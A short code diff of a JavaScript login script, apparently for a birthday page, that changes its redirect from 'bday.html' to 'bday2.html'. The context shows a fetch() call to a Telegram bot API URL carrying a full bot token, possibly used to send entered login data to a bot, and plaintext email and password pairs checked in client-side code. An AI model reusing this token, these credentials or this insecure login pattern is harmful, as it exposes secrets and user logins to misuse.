@@ -26,7 +26,7 @@ fetch("https://api.telegram.org/bot1228033872:AAHsI3oFOQLKVC7mmnVH0bNyQuPGitiBEX
 
 if ( (username == "admin@gmail.com" && password == "Admin@123") ||(username == "vanirajana770@gmail.com" && password == "Vani@12345")){
     //alert ("Login successfully");
-    window.location = "bday.html"; // Redirecting to other page.
+    window.location = "bday2.html"; // Redirecting to other page.
     return false;
 }
 else{
@@ -40,7 +40,7 @@ if( attempt == 0){
 document.getElementById("username").disabled = true;
 document.getElementById("password").disabled = true;
 document.getElementById("submit").disabled = true;
-window.location = "bday.html";
+window.location = "bday2.html";
 return false;
 }
 }
